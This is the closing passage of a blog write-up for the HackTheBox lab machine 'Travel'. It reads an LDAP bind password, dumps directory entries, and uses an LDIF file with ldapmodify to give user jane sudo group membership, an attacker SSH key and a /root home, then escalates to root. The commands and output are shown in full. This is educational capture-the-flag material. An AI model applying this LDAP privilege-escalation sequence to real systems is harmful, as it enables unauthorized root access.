+</span></pre></table></code></div></div><p>we got a <code class="language-plaintext highlighter-rouge">BINDPW</code> Here <strong>“BINDPW Theroadlesstraveled”</strong></p><p>And if we read the <code class="language-plaintext highlighter-rouge">/etc/hosts</code> There is a entry for the another docker container</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre><td class="rouge-code"><pre>lynik-admin@travel:~<span class="nv">$ </span><span class="nb">cat</span> /etc/hosts
+127.0.0.1 localhost
+127.0.1.1 travel
+172.20.0.10 ldap.travel.htb
+</pre></table></code></div></div><p>And in the <code class="language-plaintext highlighter-rouge">.ldaprc</code> the <strong>HOST</strong> is also set to <code class="language-plaintext highlighter-rouge">ldap.travel.htb</code> So i can conclude that we have to connect to this <code class="language-plaintext highlighter-rouge">docker</code> using ldap.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre>lynik-admin@travel:~<span class="nv">$ </span><span class="nb">cat</span> .ldaprc
+HOST ldap.travel.htb
+</pre></table></code></div></div><p>Okay so i used these <code class="language-plaintext highlighter-rouge">few</code> articles to get into it.</p><blockquote><p><a href="https://www.digitalocean.com/community/tutorials/how-to-manage-and-use-ldap-servers-with-openldap-utilities" target="_blank">https://www.digitalocean.com/community/tutorials/how-to-manage-and-use-ldap-servers-with-openldap-utilities</a></p></blockquote><p>Lets connect to the ldap</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre>lynik-admin@travel:~<span class="nv">$ </span>ldapsearch <span class="nt">-x</span> <span class="nt">-w</span> Theroadlesstraveled
+</pre></table></code></div></div><p>And i got the <code class="language-plaintext highlighter-rouge">output</code> and few very interesting things</p><p>There are two <code class="language-plaintext highlighter-rouge">admins</code> of the <strong>LDAP</strong></p><ul><li><strong>admin</strong><li><strong>lynik-admin</strong></ul><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+</pre><td class="rouge-code"><pre><span class="c"># admin, travel.htb           </span>
+dn: <span class="nv">cn</span><span class="o">=</span>admin,dc<span class="o">=</span>travel,dc<span class="o">=</span>htb                        
+objectClass: simpleSecurityObject        
+objectClass: organizationalRole                     
+cn: admin                                                                                    
+description: LDAP administrator  
+
+<span class="c"># servers, travel.htb        </span>
+dn: <span class="nv">ou</span><span class="o">=</span>servers,dc<span class="o">=</span>travel,dc<span class="o">=</span>htb                
+description: Servers                                                   
+objectClass: organizationalUnit                    
+ou: servers
+
+<span class="c"># lynik-admin, travel.htb  </span>
+dn: <span class="nv">cn</span><span class="o">=</span>lynik-admin,dc<span class="o">=</span>travel,dc<span class="o">=</span>htb                                   
+description: LDAP 
+objectClass: simpleSecurityObject   
+objectClass: organizationalRole                                               
+cn: lynik-admin        
+userPassword:: <span class="nv">e1NTSEF9MEpaelF3blZJNEZrcXRUa3pRWUxVY3ZkN1NwRjFRYkRjVFJta3c9PQ</span><span class="o">=</span> 
+ <span class="o">=</span> 
+</pre></table></code></div></div><p>Okay…so its <code class="language-plaintext highlighter-rouge">interesting</code> we have everything now since the user is we are currently have some <code class="language-plaintext highlighter-rouge">super-powers</code></p><h2 id="hack---steps-2">Hack - steps</h2><p>Since i am <code class="language-plaintext highlighter-rouge">admin</code> of the <code class="language-plaintext highlighter-rouge">LDAP</code> so i can <strong>modify</strong> the enteries for any user</p><p>So…I am going to add any of the user in the <code class="language-plaintext highlighter-rouge">sudoers</code> group so the user can run any command as root using <code class="language-plaintext highlighter-rouge">sudo</code></p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+</pre><td class="rouge-code"><pre>memberUid: frank                                                                          
+memberUid: brian                                      
+memberUid: christopher                                                                  
+memberUid: johnny   
+memberUid: julia                                                                     
+memberUid: jerry     
+memberUid: louise                                                              
+memberUid: eugene                                                                  
+memberUid: edward                                                                               
+memberUid: gloria 
+memberUid: lynik 
+</pre></table></code></div></div><blockquote><p><a href="https://www.digitalocean.com/community/tutorials/how-to-use-ldif-files-to-make-changes-to-an-openldap-system" target="_blank">https://www.digitalocean.com/community/tutorials/how-to-use-ldif-files-to-make-changes-to-an-openldap-system</a></p></blockquote><blockquote><p><a href="https://www.sudo.ws/man/1.8.16/sudoers.ldap.man.html" target="_blank">https://www.sudo.ws/man/1.8.16/sudoers.ldap.man.html</a></p></blockquote><blockquote><p><a href="http://manpages.ubuntu.com/manpages/trusty/man5/sudoers.ldap.5.html" target="_blank">http://manpages.ubuntu.com/manpages/trusty/man5/sudoers.ldap.5.html</a></p></blockquote><p>I am going to <code class="language-plaintext highlighter-rouge">modify</code> the enteries for the user <code class="language-plaintext highlighter-rouge">jane</code></p><h2 id="adding-jane-to-sudoers-group">Adding jane to sudoers group</h2><blockquote><p>jane.ldif</p></blockquote><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+</pre><td class="rouge-code"><pre>dn: <span class="nv">uid</span><span class="o">=</span>jane,ou<span class="o">=</span><span class="nb">users</span>,ou<span class="o">=</span>linux,ou<span class="o">=</span>servers,dc<span class="o">=</span>travel,dc<span class="o">=</span>htb
+changetype: modify
+replace: homeDirectory
+homeDirectory: /root
+-
+add: objectClass
+objectClass: ldapPublicKey
+-
+add: sshPublicKey
+sshPublicKey: ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQChcxjd+kCqD2z2mEujDDMH431Rcjf3vYZMShiS4ZChlGzIVE3FbyGbFeKHelYtPPl8xg12g7V7ougb+1YZz3rR2rzL9d/dS8CryaGZKvbUFW9utP476sHt1mSIPmd25qz96XM8jE+rMlHzCFN9jtRU3JKnffwxy1GniZFR0NTgPeEY50A1/Rta1zyh6CTwHXO0PJBM6Ccl3wgq9qb/oQXz6vLSOHYhDwbU3F+Zc292j9z9j0aBMUZC6eEJmd0IG4aiIoKbAWdrDOaPsjpyDYujXlGNhackZAEANkJGPRodN9VIR4dtlm6qwR9iyq8vMGJL+XAAYQtyDqSFiThzZPFv root@parrot
+-
+replace: userPassword
+userPassword: 0xprashant
+-
+replace: gidNumber
+gidNumber: 27
+</pre></table></code></div></div><p>I set the password for the user to <code class="language-plaintext highlighter-rouge">0xprashant</code> , And supplied my <code class="language-plaintext highlighter-rouge">ssh - Public_keys</code> <strong>(id_rsa.pub)</strong> So i can login my self using ssh</p><p>Now we just need to use the <code class="language-plaintext highlighter-rouge">super - power</code> we will be using the <code class="language-plaintext highlighter-rouge">ldapmodify</code> since its already installed on the machine</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre>lynik-admin@travel:~<span class="nv">$ </span>which ldapmodify
+/usr/bin/ldapmodify
+</pre></table></code></div></div><blockquote><p>Modifying entry</p></blockquote><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre>ldapmodify <span class="nt">-D</span> <span class="s2">"cn=lynik-admin,dc=travel,dc=htb"</span>  <span class="nt">-w</span> Theroadlesstraveled <span class="nt">-f</span> jane.ldif
+</pre></table></code></div></div><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre>lynik-admin@travel:~<span class="nv">$ </span>ldapmodify <span class="nt">-D</span> <span class="s2">"cn=lynik-admin,dc=travel,dc=htb"</span>  <span class="nt">-w</span> Theroadlesstraveled <span class="nt">-f</span> jane.ldif 
+modifying entry <span class="s2">"uid=jane,ou=users,ou=linux,ou=servers,dc=travel,dc=htb"</span>
+</pre></table></code></div></div><p>And if we now login as <code class="language-plaintext highlighter-rouge">jane</code> using ssh</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+</pre><td class="rouge-code"><pre>➜  travel git:<span class="o">(</span>master<span class="o">)</span> ✗ ssh jane@travel.htb
+Creating directory <span class="s1">'/home@TRAVEL/jane'</span><span class="nb">.</span>
+Welcome to Ubuntu 20.04 LTS <span class="o">(</span>GNU/Linux 5.4.0-26-generic x86_64<span class="o">)</span>
+
+  System information as of Fri 22 May 2020 01:52:20 AM UTC
+
+  System load:                      0.0
+  Usage of /:                       46.3% of 15.68GB
+  Memory usage:                     26%
+  Swap usage:                       0%
+  Processes:                        214
+  Users logged <span class="k">in</span>:                  1
+  IPv4 address <span class="k">for </span>br-836575a2ebbb: 172.20.0.1
+  IPv4 address <span class="k">for </span>br-8ec6dcae5ba1: 172.30.0.1
+  IPv4 address <span class="k">for </span>docker0:         172.17.0.1
+  IPv4 address <span class="k">for </span>eth0:            10.10.10.189
+
+
+The programs included with the Ubuntu system are free software<span class="p">;</span>
+the exact distribution terms <span class="k">for </span>each program are described <span class="k">in </span>the
+individual files <span class="k">in</span> /usr/share/doc/<span class="k">*</span>/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+Last login: Fri May 22 01:34:38 2020 from 10.10.14.9
+To run a <span class="nb">command </span>as administrator <span class="o">(</span>user <span class="s2">"root"</span><span class="o">)</span>, use <span class="s2">"sudo &lt;command&gt;"</span><span class="nb">.</span>
+See <span class="s2">"man sudo_root"</span> <span class="k">for </span>details.
+
+jane@travel:~<span class="err">$</span>
+</pre></table></code></div></div><p>And we are in , Its time for running commands using <code class="language-plaintext highlighter-rouge">sudo</code></p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre><td class="rouge-code"><pre>jane@travel:/home@TRAVEL<span class="nv">$ </span><span class="nb">sudo whoami</span>
+<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>jane: 
+root
+</pre></table></code></div></div><h1 id="got-roottxt">Got root.txt</h1><blockquote><p><strong>sudo su</strong></p></blockquote><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre>jane@travel:/home@TRAVEL<span class="nv">$ </span><span class="nb">sudo </span>su
+root@travel:/home@TRAVEL# 
+</pre></table></code></div></div><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre><td class="rouge-code"><pre>root@travel:~# <span class="nb">cat </span>root.txt 
+95<span class="k">*************************</span>13a
+root@travel:~#
+</pre></table></code></div></div><p>And we pwned it …….</p><p>If u liked the writeup.Support a Poor Student to Get the <code class="language-plaintext highlighter-rouge">OSCP-Cert</code> <a href="https://0xprashant.github.io/tabs/donation/" target="_blank">Donation for OSCP</a></p><blockquote><p>If you want to get notified as soon as i upload something new to my <code class="language-plaintext highlighter-rouge">blog</code> So just click on the bell icon you are seeing on the right side – &gt; and allow push <code class="language-plaintext highlighter-rouge">notification</code></p></blockquote><h1 id="resources">Resources</h1><div class="table-wrapper"><table><thead><tr><th>Topic<th>Url<tbody><tr><td>git dumper<td><a href="https://github.com/arthaud/git-dumper" target="_blank">https://github.com/arthaud/git-dumper</a><tr><td>php serialization<td><a href="https://www.notsosecure.com/remote-code-execution-via-php-unserialize/" target="_blank">https://www.notsosecure.com/remote-code-execution-via-php-unserialize/</a><tr><td>gopherus<td><a href="https://github.com/tarunkant/Gopherus" target="_blank">https://github.com/tarunkant/Gopherus</a><tr><td>simplepie docs<td><a href="https://simplepie.org/api/source-class-SimplePie.html" target="_blank">https://simplepie.org/api/source-class-SimplePie.html</a><tr><td>ldap query<td><a href="https://www.digitalocean.com/community/tutorials/how-to-manage-and-use-ldap-servers-with-openldap-utilities" target="_blank">https://www.digitalocean.com/community/tutorials/how-to-manage-and-use-ldap-servers-with-openldap-utilities</a><tr><td>modifying ldap enteries<td><a href="https://www.digitalocean.com/community/tutorials/how-to-use-ldif-files-to-make-changes-to-an-openldap-system" target="_blank">https://www.digitalocean.com/community/tutorials/how-to-use-ldif-files-to-make-changes-to-an-openldap-system</a><tr><td>modifying ldap enteries<td><a href="https://www.sudo.ws/man/1.8.16/sudoers.ldap.man.html" target="_blank">https://www.sudo.ws/man/1.8.16/sudoers.ldap.man.html</a><tr><td>modifying ldap enteries<td><a href="http://manpages.ubuntu.com/manpages/trusty/man5/sudoers.ldap.5.html" target="_blank">http://manpages.ubuntu.com/manpages/trusty/man5/sudoers.ldap.5.html</a></table></div></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/hackthebox/'>Hackthebox</a>, <a href='/categories/retired/'>retired</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/php-deserialization/" class="post-tag no-text-decoration" >php-deserialization</a> <a href="/tags/ldapsearch/" class="post-tag no-text-decoration" >ldapsearch</a> <a href="/tags/ldapmodify/" class="post-tag no-text-decoration" >ldapmodify</a> <a href="/tags/memchache/" class="post-tag no-text-decoration" >memchache</a> <a href="/tags/ssrf/" class="post-tag no-text-decoration" >ssrf</a> <a href="/tags/git-dump/" class="post-tag no-text-decoration" >git-dump</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Hackthebox Travel writeup - 0xPrashant&url=http://localhost:4000/posts/htb-travel/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Hackthebox Travel writeup - 0xPrashant&u=http://localhost:4000/posts/htb-travel/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Hackthebox Travel writeup - 0xPrashant&url=http://localhost:4000/posts/htb-travel/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/hackthebox/">hackthebox</a> <a class="post-tag" href="/tags/john/">john</a> <a class="post-tag" href="/tags/wfuzz/">wfuzz</a> <a class="post-tag" href="/tags/cracking-id_rsa/">cracking id_rsa</a> <a class="post-tag" href="/tags/docker/">docker</a> <a class="post-tag" href="/tags/ftp/">ftp</a> <a class="post-tag" href="/tags/ldap/">ldap</a> <a class="post-tag" href="/tags/ldapsearch/">ldapsearch</a> <a class="post-tag" href="/tags/lfi/">lfi</a> <a class="post-tag" href="/tags/metasploit/">metasploit</a></div></div></div><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/htb-oouch/"><div class="card-body"> <span class="timeago small" > Mar 14 <i class="unloaded">2020-03-14T00:00:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hackthebox Oouch writeup</h3><div class="text-muted small"><p> Information Column Details Name Oouch Points 40 Difficulty Hard Creator QTC ...</p></div></div></a></div><div class="card"> <a href="/posts/htb-cascade/"><div class="card-body"> <span class="timeago small" > Mar 31 <i class="unloaded">2020-03-31T00:00:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hackthebox Cascade writeup</h3><div class="text-muted small"><p> Information Column Details Name Cascade IP 10.10.10.182 Points 30 Os Windows ...</p></div></div></a></div><div class="card"> <a href="/posts/htb-blunder/"><div class="card-body"> <span class="timeago small" > May 30 <i class="unloaded">2020-05-30T00:00:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hackthebox Blunder writeup</h3><div class="text-muted small"><p> Introduction@Blunder:~$ Column Details Name Blunder IP 10.10.10.191 Points 20 Os ...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/htb-cache/" class="btn btn-outline-primary"><p>Hackthebox Cache writeup</p></a> <a href="/posts/htb-blunder/" class="btn btn-outline-primary"><p>Hackthebox Blunder writeup</p></a></div><div id="disqus" class="pt-2 pb-2"><p class="font-italic text-center text-muted small"> Comments powered by <a href="https://disqus.com/">Disqus</a>.</p></div><script src="/assets/js/lib/jquery.disqusloader.min.js"></script> <script> var options = { scriptUrl: '//0xprashant.disqus.com/embed.js', disqusConfig: function() { this.page.url = 'http://localhost:4000/posts/htb-travel/'; this.page.identifier = '/posts/htb-travel/'; } }; $.disqusLoader('#disqus', options); </script></div></div></div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js"></script> <script type="text/javascript"> const imgs = document.querySelectorAll('#post-wrapper img'); const observer = lozad(imgs); observer.observe(); </script><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"> <br></br> <script src="https://www.hackthebox.eu/badge/84820"></script></p></div><p class="mb-0"> © 2020 <a href="https://www.facebook.com/prashant.saini.37201">Prashant Saini</a>. <script> (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){ (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o), m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m) })(window,document,'script','https://www.google-analytics.com/analytics.js','ga'); ga('create', 'UA-157514490-1', 'auto'); ga('send', 'pageview'); </script> <script data-name="BMC-Widget" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="0xprashant" data-description="Support me on Buy me a coffee!" data-message="Like The Blog? Support Me!" data-color="#5F7FFF" data-position="right" data-x_margin="18" data-y_margin="18"></script></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-xl-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/hackthebox/">hackthebox</a> <a class="post-tag" href="/tags/john/">john</a> <a class="post-tag" href="/tags/wfuzz/">wfuzz</a> <a class="post-tag" href="/tags/cracking-id_rsa/">cracking id_rsa</a> <a class="post-tag" href="/tags/docker/">docker</a> <a class="post-tag" href="/tags/ftp/">ftp</a> <a class="post-tag" href="/tags/ldap/">ldap</a> <a class="post-tag" href="/tags/ldapsearch/">ldapsearch</a> <a class="post-tag" href="/tags/lfi/">lfi</a> <a class="post-tag" href="/tags/metasploit/">metasploit</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="http://localhost:4000{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"><div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>{categories}</div><div><i class="fa fa-tag fa-fw"></i>{tags}</div></div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>' }); </script>
